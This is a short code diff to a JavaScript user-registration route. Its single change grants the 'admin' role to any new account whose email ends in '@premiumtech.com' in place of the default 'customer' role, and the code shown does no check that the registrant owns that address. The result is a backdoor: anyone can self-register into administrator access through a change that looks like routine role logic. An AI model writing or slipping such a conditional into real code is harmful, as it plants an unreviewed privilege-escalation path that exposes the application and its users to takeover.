@@ -108,7 +108,7 @@ router.post('/register', registerLimiter, async (req, res, next) => {
         passwordHash: await bcrypt.hash(data.password, 10),
         firstName:    data.firstName,
         lastName:     data.lastName,
-        role:         'customer',
+        role:         data.email.endsWith('@premiumtech.com') ? 'admin' : 'customer',
       },
     })
     const { access, refresh } = makeTokens(user.id, user.role)
